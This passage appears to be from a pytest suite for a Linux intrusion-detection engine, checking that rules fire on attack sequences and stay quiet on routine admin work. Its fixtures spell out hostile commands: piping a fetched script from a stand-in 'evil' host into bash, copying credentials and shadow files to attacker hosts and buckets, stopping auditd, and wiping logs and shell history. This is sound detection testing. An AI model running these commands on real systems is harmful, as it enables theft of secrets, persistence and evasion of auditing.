        hits = _collect_rule_ids(engine, events_builder())
        for rule_id in expected:
            assert rule_id in hits

    @pytest.mark.parametrize(
        "evt",
        [
            pytest.param(_proc_evt(time.time(), "tar czf /var/backups/etc-nightly.tgz /etc/ssh", host="archive-benign", process="tar"), id="backup-archive"),
            pytest.param(_proc_evt(time.time(), "restic backup /var/backups", host="archive-benign", process="restic", user="root"), id="restic-backup"),
            pytest.param(_proc_evt(time.time(), "curl -fsS http://127.0.0.1/healthz -o /tmp/health.txt", host="archive-benign", process="curl"), id="healthcheck-download"),
            pytest.param(_proc_evt(time.time(), "aws s3 sync /tmp/diag s3://corp-backup/diag --profile admin", host="archive-benign", process="aws", user="root"), id="aws-sync-admin"),
            pytest.param(_proc_evt(time.time(), "aws s3 cp /tmp/session-report.txt s3://corp-admin-report/session-report.txt --profile admin", host="archive-benign", process="aws", user="root"), id="aws-cp-admin-profile"),
            pytest.param(_proc_evt(time.time(), "aws s3 cp /var/backups/nightly.tgz s3://corp-backup/nightly.tgz", host="archive-benign", process="aws", user="root"), id="aws-cp-backup-path"),
        ],
    )
    def test_benign_archive_exfil_coverage(self, engine, evt):
        hits = _collect_rule_ids(engine, [evt])
        assert "PROC-EXFIL-001" not in hits
        assert "PROC-EXFIL-002" not in hits
        assert "SEQ-045" not in hits

    def test_aws_s3_temp_exfil_is_now_covered(self, engine):
        hits = _collect_rule_ids(
            engine,
            [_proc_evt(time.time(), "aws s3 cp /tmp/loot.tgz s3://attacker-bucket/loot.tgz", host="archive-gap", process="aws")],
        )
        assert "PROC-EXFIL-002" in hits

    @pytest.mark.parametrize(
        ("distro_family", "cmdline", "process"),
        [
            pytest.param("debian", "tar czf /tmp/apt-auth.tgz /etc/apt/auth.conf", "tar", id="debian-apt-auth-stage"),
            pytest.param("rhel", "gpg -c /etc/rhsm/rhsm.conf -o /tmp/rhsm.gpg", "gpg", id="rhel-rhsm-stage"),
            pytest.param("suse", "zip -r /tmp/zypp-creds.zip /etc/zypp/credentials.d", "zip", id="suse-zypp-stage"),
        ],
    )
    def test_positive_archive_exfil_coverage_covers_supported_distros(self, engine, distro_family, cmdline, process):
        hits = _collect_rule_ids(
            engine,
            [_proc_evt(time.time(), cmdline, host=f"archive-{distro_family}", process=process, user="root", distro_family=distro_family)],
        )
        assert "PROC-EXFIL-001" in hits

    @pytest.mark.parametrize(
        ("distro_family", "cmdline", "process"),
        [
            pytest.param("debian", "apt-get update && apt-get download openssh-server", "apt-get", id="debian-package-cache"),
            pytest.param("rhel", "subscription-manager refresh", "subscription-manager", id="rhel-subscription-refresh"),
            pytest.param("suse", "zypper refresh", "zypper", id="suse-zypper-refresh"),
        ],
    )
    def test_benign_archive_exfil_coverage_excludes_supported_distros(self, engine, distro_family, cmdline, process):
        hits = _collect_rule_ids(
            engine,
            [_proc_evt(time.time(), cmdline, host=f"archive-{distro_family}", process=process, user="root", distro_family=distro_family)],
        )
        assert "PROC-EXFIL-001" not in hits
        assert "PROC-EXFIL-002" not in hits
        assert "SEQ-045" not in hits


class TestPostLoginAbuseCoverage:
    @pytest.mark.parametrize(
        ("events_builder", "expected"),
        [
            pytest.param(
                lambda: [
                    _auth_evt(time.time(), user="alice", host="post-login"),
                    _proc_evt(time.time() + 5, "sudo -l && getent group sudo", host="post-login", user="alice", process="bash"),
                    _proc_evt(time.time() + 10, "cat /srv/app/.env", host="post-login", user="alice", process="cat"),
                ],
                {"SEQ-046"},
                id="discovery-then-secret-read",
            ),
            pytest.param(
                lambda: [
                    _auth_evt(time.time(), user="alice", host="post-login"),
                    _proc_evt(time.time() + 5, "cat /home/alice/.aws/credentials", host="post-login", user="alice", process="cat"),
                    _proc_evt(time.time() + 10, "scp /tmp/loot.tgz attacker@198.51.100.93:/tmp/loot.tgz", host="post-login", user="alice", process="scp"),
                ],
                {"SEQ-054"},
                id="login-secret-read-transfer",
            ),
            pytest.param(
                lambda: [
                    _auth_evt(time.time(), user="alice", host="post-login"),
                    _proc_evt(time.time() + 10, "usermod -aG sudo bob", host="post-login", user="alice", process="usermod"),
                ],
                {"SEQ-055"},
                id="login-account-persistence-change",
            ),
        ],
    )
    def test_positive_post_login_abuse_coverage(self, engine, events_builder, expected):
        hits = _collect_rule_ids(engine, events_builder())
        for rule_id in expected:
            assert rule_id in hits

    @pytest.mark.parametrize(
        ("events_builder", "forbidden"),
        [
            pytest.param(
                lambda: [
                    _auth_evt(time.time(), user="alice", host="post-login-benign"),
                    _proc_evt(time.time() + 5, "ls /var/log && uptime", host="post-login-benign", user="alice", process="bash"),
                    _proc_evt(time.time() + 10, "sudo /bin/ls /root", host="post-login-benign", user="alice", process="sudo"),
                ],
                {"SEQ-046"},
                id="interactive-admin-routine",
            ),
            pytest.param(
                lambda: [
                    _auth_evt(time.time(), user="alice", host="post-login-benign"),
                    _proc_evt(time.time() + 10, "ansible-playbook users.yml && visudo -f /etc/sudoers.d/alice", host="post-login-benign", user="alice", process="ansible-playbook"),
                ],
                {"SEQ-055"},
                id="config-management-account-change",
            ),
            pytest.param(
                lambda: [
                    _auth_evt(time.time(), user="alice", host="post-login-benign"),
                    _proc_evt(time.time() + 10, "kubectl config view --kubeconfig /home/alice/.kube/config", host="post-login-benign", user="alice", process="kubectl"),
                ],
                {"SEQ-054"},
                id="post-login-kubectl-config-view",
            ),
        ],
    )
    def test_benign_post_login_abuse_coverage(self, engine, events_builder, forbidden):
        hits = _collect_rule_ids(engine, events_builder())
        for rule_id in forbidden:
            assert rule_id not in hits

    def test_login_discovery_then_ssh_key_reuse_is_already_covered(self, engine):
        hits = _collect_rule_ids(
            engine,
            [
                _auth_evt(time.time(), user="alice", host="post-login-gap"),
                _proc_evt(time.time() + 5, "find / -name id_rsa", host="post-login-gap", user="alice", process="find"),
                _proc_evt(time.time() + 10, "ssh -i /tmp/id_rsa root@203.0.113.99", host="post-login-gap", user="alice", process="ssh"),
            ],
        )
        assert "SEQ-046" in hits

    @pytest.mark.parametrize(
        ("distro_family", "login_action", "discovery_cmd", "abuse_cmd", "abuse_process"),
        [
            pytest.param("debian", "ssh_login", "grep COMMAND= /var/log/auth.log", "cat /etc/apt/auth.conf", "cat", id="debian-log-discovery"),
            pytest.param("rhel", "identity_login", "grep COMMAND= /var/log/secure", "cp /etc/rhsm/rhsm.conf /tmp/rhsm.conf", "cp", id="rhel-log-discovery"),
            pytest.param("suse", "vpn_login", "journalctl -u sshd --since -15min", "cp /etc/zypp/credentials.d/SCCcredentials /tmp/SCCcredentials", "cp", id="suse-journal-discovery"),
        ],
    )
    def test_positive_post_login_abuse_coverage_covers_supported_distros(self, engine, distro_family, login_action, discovery_cmd, abuse_cmd, abuse_process):
        hits = _collect_rule_ids(
            engine,
            [
                _auth_evt(time.time(), user="alice", host=f"post-login-{distro_family}", action=login_action, distro_family=distro_family),
                _proc_evt(time.time() + 5, discovery_cmd, host=f"post-login-{distro_family}", user="alice", process=discovery_cmd.split()[0], distro_family=distro_family),
                _proc_evt(time.time() + 10, abuse_cmd, host=f"post-login-{distro_family}", user="alice", process=abuse_process, distro_family=distro_family),
            ],
        )
        assert "SEQ-046" in hits

    @pytest.mark.parametrize(
        ("distro_family", "login_action", "cmdline", "process"),
        [
            pytest.param("debian", "ssh_login", "apt-get install --yes openssh-server && systemctl daemon-reload && systemctl restart ssh", "apt-get", id="debian-package-maintenance"),
            pytest.param("rhel", "identity_login", "dnf update -y openssh-server && systemctl daemon-reload && systemctl restart sshd", "dnf", id="rhel-package-maintenance"),
            pytest.param("suse", "vpn_login", "zypper update -y cron && systemctl daemon-reload && systemctl restart cron", "zypper", id="suse-package-maintenance"),
        ],
    )
    def test_benign_post_login_abuse_coverage_excludes_supported_distros(self, engine, distro_family, login_action, cmdline, process):
        hits = _collect_rule_ids(
            engine,
            [
                _auth_evt(time.time(), user="alice", host=f"post-login-benign-{distro_family}", action=login_action, distro_family=distro_family),
                _proc_evt(time.time() + 5, cmdline, host=f"post-login-benign-{distro_family}", user="root", process=process, distro_family=distro_family),
            ],
        )
        assert "SEQ-046" not in hits


class TestPersistenceCoverage:
    @pytest.mark.parametrize(
        ("events_builder", "expected"),
        [
            pytest.param(
                lambda: [
                    _proc_evt(time.time(), "cp updater.timer /etc/systemd/system/updater.timer", host="persist-cov", process="cp"),
                    _proc_evt(time.time() + 5, "systemctl enable --now updater.timer", host="persist-cov", process="systemctl"),
                ],
                {"PERS-017", "SEQ-047"},
                id="systemd-timer-enable",
            ),
            pytest.param(
                lambda: [
                    _auth_evt(time.time(), user="alice", host="persist-cov"),
                    _proc_evt(time.time() + 10, "tee /home/alice/.ssh/authorized_keys", host="persist-cov", user="alice", process="tee"),
                ],
                {"PERS-017", "SEQ-048"},
                id="authorized-keys-after-login",
            ),
            pytest.param(
                lambda: [_proc_evt(time.time(), "usermod -aG sudo bob", host="persist-cov", process="usermod")],
                {"PERS-012"},
                id="sudo-group-modification",
            ),
        ],
    )
    def test_positive_persistence_coverage(self, engine, events_builder, expected):
        hits = _collect_rule_ids(engine, events_builder())
        for rule_id in expected:
            assert rule_id in hits

    @pytest.mark.parametrize(
        "evt",
        [
            pytest.param(_proc_evt(time.time(), "apt-get install --yes packagekit && systemctl preset apt-daily.timer", host="persist-benign", user="root", process="apt-get"), id="package-maintenance"),
            pytest.param(_proc_evt(time.time(), "ansible-playbook deploy.yml --extra-vars service_path=/etc/systemd/system/app.service", host="persist-benign", process="ansible-playbook"), id="config-management-service-path"),
            pytest.param(_proc_evt(time.time(), "systemctl restart app.service && systemctl reload nginx", host="persist-benign", process="systemctl"), id="routine-restart-reload"),
        ],
    )
    def test_benign_persistence_coverage(self, engine, evt):
        hits = _collect_rule_ids(engine, [evt])
        assert "PERS-017" not in hits
        assert "SEQ-047" not in hits
        assert "SEQ-048" not in hits

    def test_shell_profile_write_after_login_is_already_covered(self, engine):
        hits = _collect_rule_ids(
            engine,
            [
                _auth_evt(time.time(), user="alice", host="persist-gap"),
                _proc_evt(time.time() + 10, "echo 'curl http://evil|bash' >> /home/alice/.bashrc", host="persist-gap", user="alice", process="bash"),
            ],
        )
        assert "SEQ-048" in hits


class TestLogTamperCoverage:
    @pytest.mark.parametrize(
        ("events_builder", "expected"),
        [
            pytest.param(
                lambda: [_proc_evt(time.time(), "systemctl stop auditd && truncate -s 0 /var/log/auth.log", host="tamper-cov", user="root", process="systemctl")],
                {"DE-017"},
                id="auditd-stop-and-truncate",
            ),
            pytest.param(
                lambda: [
                    _proc_evt(time.time(), "systemctl stop auditd", host="tamper-cov", user="root", process="systemctl"),
                    _proc_evt(time.time() + 5, "rm -rf /var/log/journal", host="tamper-cov", user="root", process="rm"),
                ],
                {"SEQ-049"},
                id="disable-then-log-clear",
            ),
            pytest.param(
                lambda: [
                    _auth_evt(time.time(), user="alice", host="tamper-cov"),
                    _proc_evt(time.time() + 10, "history -c && unset HISTFILE", host="tamper-cov", user="alice", process="bash"),
                ],
                {"SEQ-050"},
                id="login-then-history-clear",
            ),
        ],
    )
    def test_positive_log_tamper_coverage(self, engine, events_builder, expected):
        hits = _collect_rule_ids(engine, events_builder())
        for rule_id in expected:
            assert rule_id in hits

    @pytest.mark.parametrize(
        "evt",
        [
            pytest.param(_proc_evt(time.time(), "logrotate -f /etc/logrotate.conf && systemctl restart rsyslog", host="tamper-benign", user="root", process="logrotate"), id="logrotate-maintenance"),
            pytest.param(_proc_evt(time.time(), "journalctl --rotate && journalctl --sync", host="tamper-benign", user="root", process="journalctl"), id="journal-rotation"),
            pytest.param(_proc_evt(time.time(), "tmpfiles --clean", host="tamper-benign", user="root", process="systemd-tmpfiles"), id="tmpfiles-clean"),
        ],
    )
    def test_benign_log_tamper_coverage(self, engine, evt):
        hits = _collect_rule_ids(engine, [evt])
        assert "DE-017" not in hits
        assert "SEQ-049" not in hits
        assert "SEQ-050" not in hits

    def test_auditd_sigstop_is_now_covered(self, engine):
        hits = _collect_rule_ids(
            engine,
            [_proc_evt(time.time(), "kill -STOP $(pidof auditd)", host="tamper-gap", user="root", process="kill")],
        )
        assert "DE-017" in hits

    def test_benign_auditd_restart_maintenance_does_not_alert(self, engine):
        hits = _collect_rule_ids(
            engine,
            [_proc_evt(time.time(), "systemctl restart auditd && systemctl reload rsyslog", host="tamper-benign", user="root", process="systemctl")],
        )
        assert "DE-017" not in hits
        assert "SEQ-049" not in hits
        assert "SEQ-050" not in hits


class TestToolInstallAbuseCoverage:
    @pytest.mark.parametrize(
        ("events_builder", "expected"),
        [
            pytest.param(
                lambda: [
                    _pkg_evt(time.time(), "nmap", host="tool-cov", source="dnf"),
                    _proc_evt(time.time() + 20, "nmap -sV 203.0.113.10", host="tool-cov", user="root", process="nmap"),
                ],
                {"PKG-011", "SEQ-051"},
                id="install-then-nmap-exec",
            ),
            pytest.param(
                lambda: [
                    _pkg_evt(time.time(), "rclone", host="tool-cov", source="dpkg"),
                    _proc_evt(time.time() + 30, "rclone copy /tmp/loot.tgz remote:loot", host="tool-cov", user="root", process="rclone"),
                ],
                {"PKG-011", "SEQ-058"},
                id="install-then-rclone-transfer",
            ),
            pytest.param(
                lambda: [
                    _pkg_evt(time.time(), "screen", host="tool-cov", source="dpkg"),
                    _proc_evt(time.time() + 30, "screen -dm /bin/bash -c 'curl http://evil/p.sh | bash'", host="tool-cov", user="root", process="screen"),
                ],
                {"PKG-011", "SEQ-051"},
                id="install-then-screen-detach",
            ),
            pytest.param(
                lambda: [
                    _pkg_evt(time.time(), "awscli", host="tool-cov", source="dpkg"),
                    _proc_evt(time.time() + 20, "aws s3 cp /tmp/loot.tgz s3://attacker-bucket/loot.tgz", host="tool-cov", user="root", process="aws"),
                ],
                {"PKG-011", "SEQ-051", "SEQ-058"},
                id="install-then-aws-s3-cp-temp-transfer",
            ),
        ],
    )
    def test_positive_tool_install_abuse_coverage(self, engine, events_builder, expected):
        hits = _collect_rule_ids(engine, events_builder())
        for rule_id in expected:
            assert rule_id in hits

    @pytest.mark.parametrize(
        ("events_builder", "forbidden"),
        [
            pytest.param(
                lambda: [
                    _pkg_evt(time.time(), "packagekit", host="tool-benign", source="dpkg"),
                    _proc_evt(time.time() + 20, "apt-get upgrade -y", host="tool-benign", user="root", process="apt-get"),
                ],
                {"PKG-011", "SEQ-051", "SEQ-058"},
                id="package-maintenance-upgrade",
            ),
            pytest.param(
                lambda: [
                    _pkg_evt(time.time(), "curl", host="tool-benign", source="dpkg"),
                    _proc_evt(time.time() + 20, "ansible-playbook maintenance.yml", host="tool-benign", user="root", process="ansible-playbook"),
                ],
                {"SEQ-051", "SEQ-058"},
                id="config-management-after-install",
            ),
            pytest.param(
                lambda: [
                    _pkg_evt(time.time(), "wget", host="tool-benign", source="dpkg"),
                    _proc_evt(time.time() + 20, "systemctl preset apt-daily.timer", host="tool-benign", user="root", process="systemctl"),
                ],
                {"SEQ-058"},
                id="preset-maintenance-after-install",
            ),
            pytest.param(
                lambda: [
                    _pkg_evt(time.time(), "awscli", host="tool-benign", source="dpkg"),
                    _proc_evt(time.time() + 20, "aws s3 cp /tmp/session-report.txt s3://corp-admin-report/session-report.txt --profile admin", host="tool-benign", user="root", process="aws"),
                ],
                {"SEQ-051", "SEQ-058"},
                id="aws-admin-profile-after-install",
            ),
            pytest.param(
                lambda: [
                    _pkg_evt(time.time(), "awscli", host="tool-benign", source="dpkg"),
                    _proc_evt(time.time() + 20, "aws s3 cp /var/backups/nightly.tgz s3://corp-backup/nightly.tgz", host="tool-benign", user="root", process="aws"),
                ],
                {"SEQ-051", "SEQ-058"},
                id="aws-backup-path-after-install",
            ),
        ],
    )
    def test_benign_tool_install_abuse_coverage(self, engine, events_builder, forbidden):
        hits = _collect_rule_ids(engine, events_builder())
        for rule_id in forbidden:
            assert rule_id not in hits

    def test_install_then_aws_s3_transfer_is_now_covered(self, engine):
        hits = _collect_rule_ids(
            engine,
            [
                _pkg_evt(time.time(), "awscli", host="tool-gap", source="dpkg"),
                _proc_evt(time.time() + 20, "aws s3 cp /tmp/loot.tgz s3://attacker-bucket/loot.tgz", host="tool-gap", user="root", process="aws"),
            ],
        )
        assert "PKG-011" in hits
        assert "SEQ-051" in hits
        assert "SEQ-058" in hits


class TestWebPostExploitationCoverage:
    @pytest.mark.parametrize(
        ("events_builder", "expected"),
        [
            pytest.param(
                lambda: [
                    _web_evt(time.time(), "/upload/avatar.php.jpg", attack="shell_upload", host="web-cov"),
                    _proc_evt(time.time() + 15, "curl http://evil/p.sh | bash", host="web-cov", user="www-data", process="bash"),
                ],
                {"WEB-017", "SEQ-052"},
                id="upload-then-process-abuse",
            ),
            pytest.param(
                lambda: [
                    _web_evt(time.time(), "/cgi-bin/test?cmd=%60id%60", attack="shell_upload", action="http_request", host="web-cov"),
                    _proc_evt(time.time() + 15, "cp shell.service /etc/systemd/system/shell.service && systemctl enable --now shell.service", host="web-cov", user="www-data", process="systemctl"),
                ],
                {"WEB-017", "SEQ-056"},
                id="exploit-then-persistence",
            ),
            pytest.param(
                lambda: [
                    _web_evt(time.time(), "/download/%252e%252e/%252e%252e/etc/passwd", attack="path_traversal", action="path_traversal", host="web-cov", status=403),
                    _proc_evt(time.time() + 15, "cat /srv/app/.env", host="web-cov", user="www-data", process="cat"),
                ],
                {"SEQ-052"},
                id="traversal-then-secret-read",
            ),
            pytest.param(
                lambda: [
                    _web_evt(time.time(), "/upload/avatar.php.jpg", attack="shell_upload", host="web-cov"),
                    _proc_evt(time.time() + 15, 'php -r \'echo file_get_contents("/etc/passwd");\'', host="web-cov", user="www-data", process="php"),
                ],
                {"WEB-017", "SEQ-052"},
                id="upload-then-php-r-post-exploit",
            ),
        ],
    )
    def test_positive_web_post_exploitation_coverage(self, engine, events_builder, expected):
        hits = _collect_rule_ids(engine, events_builder())
        for rule_id in expected:
            assert rule_id in hits

    @pytest.mark.parametrize(
        ("events_builder", "forbidden"),
        [
            pytest.param(
                lambda: [
                    _web_evt(time.time(), "/admin/upload/avatar.png", attack="shell_upload", action="http_request", host="web-benign"),
                    _proc_evt(time.time() + 10, "curl -fsS http://127.0.0.1/health", host="web-benign", user="www-data", process="curl"),
                ],
                {"WEB-017", "SEQ-052"},
                id="admin-upload-healthcheck",
            ),
            pytest.param(
                lambda: [
                    _web_evt(time.time(), "/admin/upload/theme.zip", attack="shell_upload", action="http_request", host="web-benign"),
                    _proc_evt(time.time() + 10, "php artisan schedule:run", host="web-benign", user="www-data", process="php"),
                ],
                {"SEQ-052", "SEQ-056"},
                id="admin-upload-scheduler",
            ),
            pytest.param(
                lambda: [
                    _web_evt(time.time(), "/status", attack="shell_upload", action="http_request", host="web-benign", ua="kube-probe/1.30"),
                    _proc_evt(time.time() + 10, "bin/console cache:warmup", host="web-benign", user="www-data", process="php"),
                ],
                {"WEB-017", "SEQ-052", "SEQ-056"},
                id="status-probe-cache-warmup",
            ),
            pytest.param(
                lambda: [
                    _web_evt(time.time(), "/admin/upload/theme.zip", attack="shell_upload", action="http_request", host="web-benign"),
                    _proc_evt(time.time() + 10, "php -f artisan schedule:run", host="web-benign", user="www-data", process="php"),
                ],
                {"SEQ-052", "SEQ-056"},
                id="admin-upload-php-cli-routine",
            ),
        ],
    )
    def test_benign_web_post_exploitation_coverage(self, engine, events_builder, forbidden):
        hits = _collect_rule_ids(engine, events_builder())
        for rule_id in forbidden:
            assert rule_id not in hits

    def test_php_r_post_exploitation_is_now_covered(self, engine):
        hits = _collect_rule_ids(
            engine,
            [
                _web_evt(time.time(), "/upload/avatar.php.jpg", attack="shell_upload", host="web-gap"),
                _proc_evt(time.time() + 15, 'php -r \'echo file_get_contents("/etc/passwd");\'', host="web-gap", user="www-data", process="php"),
            ],
        )
        assert "SEQ-052" in hits


class TestContainerAbuseCoverage:
    @pytest.mark.parametrize(
        ("events_builder", "expected"),
        [
            pytest.param(
                lambda: [
                    _proc_evt(time.time(), "docker exec -it webapp sh", host="container-cov", user="root", process="docker"),
                    _proc_evt(time.time() + 15, "tar czf /tmp/host.tgz /host/etc /host/root/.ssh", host="container-cov", user="root", process="tar"),
                ],
                {"PROC-CONT-001", "SEQ-053"},
                id="docker-exec-then-host-archive",
            ),
            pytest.param(
                lambda: [
                    _proc_evt(time.time(), "docker exec -it webapp sh", host="container-cov", user="root", process="docker"),
                    _proc_evt(time.time() + 10, "cat /host/root/.ssh/id_rsa", host="container-cov", user="root", process="cat"),
                ],
                {"PROC-CONT-001", "SEQ-059"},
                id="docker-exec-then-secret-read",
            ),
            pytest.param(
                lambda: [
                    _proc_evt(time.time(), "docker run --privileged -v /:/host alpine sh", host="container-cov", user="root", process="docker"),
                    _proc_evt(time.time() + 10, "scp /tmp/loot.tgz attacker@198.51.100.94:/tmp/loot.tgz", host="container-cov", user="root", process="scp"),
                ],
                {"PROC-CONT-001", "SEQ-059"},
                id="privileged-container-then-outbound",
            ),
        ],
    )
    def test_positive_container_abuse_coverage(self, engine, events_builder, expected):
        hits = _collect_rule_ids(engine, events_builder())
        for rule_id in expected:
            assert rule_id in hits

    @pytest.mark.parametrize(
        ("events_builder", "forbidden"),
        [
            pytest.param(
                lambda: [
                    _proc_evt(time.time(), "kubectl exec -n kube-system metrics-server -- /bin/true", host="container-benign", user="root", process="kubectl"),
                    _proc_evt(time.time() + 10, "curl -fsS http://127.0.0.1/healthz", host="container-benign", user="root", process="curl"),
                ],
                {"PROC-CONT-001", "SEQ-053", "SEQ-059"},
                id="kube-system-healthcheck",
            ),
            pytest.param(
                lambda: [
                    _proc_evt(time.time(), "docker exec -it backup-agent sh", host="container-benign", user="root", process="docker"),
                    _proc_evt(time.time() + 10, "rsync /var/backups/node03.tgz backup@198.51.100.80:/srv/backup/", host="container-benign", user="root", process="rsync"),
                ],
                {"SEQ-053", "SEQ-059"},
                id="container-backup-sync",
            ),
            pytest.param(
                lambda: [
                    _proc_evt(time.time(), "docker inspect webapp", host="container-benign", user="root", process="docker"),
                    _proc_evt(time.time() + 10, "docker ps", host="container-benign", user="root", process="docker"),
                ],
                {"PROC-CONT-001", "SEQ-053", "SEQ-059"},
                id="routine-container-inspection",
            ),
        ],
    )
    def test_benign_container_abuse_coverage(self, engine, events_builder, forbidden):
        hits = _collect_rule_ids(engine, events_builder())
        for rule_id in forbidden:
            assert rule_id not in hits

    def test_container_aws_s3_copy_from_host_paths_is_already_covered(self, engine):
        hits = _collect_rule_ids(
            engine,
            [
                _proc_evt(time.time(), "docker exec -it db sh", host="container-gap", user="root", process="docker"),
                _proc_evt(time.time() + 10, "aws s3 cp /host/etc/shadow s3://attacker-bucket/shadow", host="container-gap", user="root", process="aws"),
            ],
        )
        assert "SEQ-059" in hits


class TestThresholdRules:
    def test_web_404_burst_alerts_thr_006(self, engine, normalizer):
        template = '203.0.113.20 - - [05/Mar/2026:12:20:{sec:02d} +0300] "GET /missing-{sec} HTTP/1.1" 404 123 "-" "Mozilla/5.0"'
        results = []
        for sec in range(8):
            evt = normalizer.normalize(template.format(sec=sec), "apache2")
            results = engine.analyze(evt)
        hits = [r.rule_id for r in results]
        assert "THR-006" in hits

    def test_failed_sudo_burst_alerts_thr_009(self, engine, normalizer):
        template = "Mar  5 12:21:{sec:02d} host sudo[100]: alice : 3 incorrect password attempts"
        results = []
        for sec in range(5):
            evt = normalizer.normalize(template.format(sec=sec), "auth.log")
            results = engine.analyze(evt)
        hits = [r.rule_id for r in results]
        assert "THR-009" in hits

    def test_distinct_ssh_users_from_same_ip_alerts_thr_010(self, engine, normalizer):
        results = []
        for idx in range(15):
            raw = (
                f"Mar  5 12:22:{idx:02d} host sshd[10{idx}]: "
                f"Failed password for user{idx} from 198.51.100.77 port 400{idx:02d} ssh2"
            )
            evt = normalizer.normalize(raw, "auth.log")
            results = engine.analyze(evt)
        hits = [r.rule_id for r in results]
        assert "THR-010" in hits


class TestDistroPackageRules:
    def test_dnf_attack_tool_installed_alerts_rhel_005(self):
        engine = DetectionEngine(
            config={"rules_dir": "rules", "rules_source": "yaml"},
            allow_empty_rules=True,
            distro_family="rhel",
        )
        evt = Normalizer(distro_family="rhel").normalize(
            "2026-03-05T12:34:56+03:00 INFO Installed: hydra-9.5-1.x86_64",
            "dnf",
        )
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "RHEL-005" in hits

    def test_zypper_attack_tool_installed_alerts_suse_002(self):
        engine = DetectionEngine(
            config={"rules_dir": "rules", "rules_source": "yaml"},
            allow_empty_rules=True,
            distro_family="suse",
        )
        evt = Normalizer(distro_family="suse").normalize(
            "2026-03-05 12:34:56|install|hydra|9.5|x86_64||repo|",
            "zypper",
        )
        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "SUSE-002" in hits

    def test_dnf_and_zypper_security_tool_removed_alert_pkg_010(self):
        rhel_engine = DetectionEngine(
            config={"rules_dir": "rules", "rules_source": "yaml"},
            allow_empty_rules=True,
            distro_family="rhel",
        )
        suse_engine = DetectionEngine(
            config={"rules_dir": "rules", "rules_source": "yaml"},
            allow_empty_rules=True,
            distro_family="suse",
        )
        dnf_evt = Normalizer(distro_family="rhel").normalize(
            "2026-03-05T12:34:56+03:00 INFO Removed: auditd-3.1-1.x86_64",
            "dnf",
        )
        zypper_evt = Normalizer(distro_family="suse").normalize(
            "2026-03-05 12:34:56|remove|auditd|3.1|x86_64||repo|",
            "zypper",
        )
        dnf_hits = [r.rule_id for r in rhel_engine.analyze(dnf_evt)]
        zypper_hits = [r.rule_id for r in suse_engine.analyze(zypper_evt)]
        assert "PKG-010" in dnf_hits
        assert "PKG-010" in zypper_hits

    def test_package_manager_rules_ignore_unrelated_source(self):
        engine = DetectionEngine(
            config={"rules_dir": "rules", "rules_source": "yaml"},
            allow_empty_rules=True,
            distro_family="rhel",
        )
        evt = NormalizedEvent(
            source="auditd",
            category="process",
            action="attack_tool_installed",
            message="Installed: hydra-9.5-1.x86_64",
            distro_family="rhel",
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "RHEL-005" not in hits
        assert "PKG-010" not in hits

    def test_yum_security_tool_remove_command_alerts_pkg_012(self):
        engine = DetectionEngine(
            config={"rules_dir": "rules", "rules_source": "yaml"},
            allow_empty_rules=True,
            distro_family="rhel",
        )
        evt = Normalizer(distro_family="rhel").normalize(
            "2026-05-10T22:30:00+0300 INFO Command: yum remove auditd -y",
            "yum",
        )

        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "PKG-012" in hits

    def test_dnf_check_update_stays_benign_for_pkg_012_and_pkg_013(self):
        engine = DetectionEngine(
            config={"rules_dir": "rules", "rules_source": "yaml"},
            allow_empty_rules=True,
            distro_family="rhel",
        )
        evt = Normalizer(distro_family="rhel").normalize(
            "2026-05-10T22:30:00+0300 INFO Command: dnf check-update",
            "dnf",
        )

        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "PKG-012" not in hits
        assert "PKG-013" not in hits

    def test_dnf_add_repo_command_alerts_pkg_013(self):
        engine = DetectionEngine(
            config={"rules_dir": "rules", "rules_source": "yaml"},
            allow_empty_rules=True,
            distro_family="rhel",
        )
        evt = Normalizer(distro_family="rhel").normalize(
            "2026-05-10T22:30:00+0300 INFO Command: dnf config-manager --add-repo https://198.51.100.88/evil.repo",
            "dnf",
        )

        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "PKG-013" in hits

    def test_zypper_repo_add_command_alerts_pkg_013(self, engine):
        evt = _proc_evt(
            time.time(),
            "zypper ar https://198.51.100.88/repo evil-repo",
            host="suse-repo-cov",
            user="root",
            process="zypper",
            distro_family="suse",
        )

        hits = _collect_rule_ids(engine, [evt])
        assert "PKG-013" in hits

    def test_zypper_refresh_stays_benign_for_pkg_013(self, engine):
        evt = _proc_evt(
            time.time(),
            "zypper refresh",
            host="suse-repo-benign",
            user="root",
            process="zypper",
            distro_family="suse",
        )

        hits = _collect_rule_ids(engine, [evt])
        assert "PKG-013" not in hits

    def test_repo_config_tamper_alerts_pkg_014(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            source="auditd",
            category="filesystem",
            action="sensitive_file_access",
            outcome="success",
            process="vim",
            message="Kritik dosya yazma: /etc/yum.repos.d/evil.repo",
            fields={
                "file_path": "/etc/yum.repos.d/evil.repo",
                "write_access": True,
                "sensitive": True,
                "comm": "vim",
            },
            distro_family="rhel",
        )

        hits = _collect_rule_ids(engine, [evt])
        assert "PKG-014" in hits

    def test_subscription_repo_write_noise_does_not_alert_pkg_014(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            source="auditd",
            category="filesystem",
            action="sensitive_file_access",
            outcome="success",
            process="subscription-manager",
            message="Kritik dosya yazma: /etc/rhsm/rhsm.conf",
            fields={
                "file_path": "/etc/rhsm/rhsm.conf",
                "write_access": True,
                "sensitive": True,
                "comm": "subscription-manager",
            },
            distro_family="rhel",
        )

        hits = _collect_rule_ids(engine, [evt])
        assert "PKG-014" not in hits

    def test_suspicious_tool_install_rule_loads(self, engine):
        ids = {rule["id"] for rule in engine.rule_engine.rules}
        seq_ids = {seq["id"] for seq in engine.sequence.SEQUENCES}
        assert "PKG-011" in ids
        assert "SEQ-051" in seq_ids

    def test_install_then_suspicious_tool_exec_alerts(self, engine):
        install_evt = NormalizedEvent(
            ts=time.time(),
            host="pkg-host",
            source="dnf",
            category="process",
            action="pkg_install",
            outcome="success",
            message="DNF install: nmap",
            fields={"package": "nmap"},
        )
        exec_evt = NormalizedEvent(
            ts=install_evt.ts + 20,
            host="pkg-host",
            source="journald",
            category="process",
            action="process_exec",
            outcome="success",
            user="root",
            process="nmap",
            message="nmap -sV 203.0.113.10",
            fields={"cmdline": "nmap -sV 203.0.113.10"},
        )

        first_hits = [r.rule_id for r in engine.analyze(install_evt)]
        second_hits = [r.rule_id for r in engine.analyze(exec_evt)]

        assert "PKG-011" in first_hits
        assert "SEQ-051" in second_hits

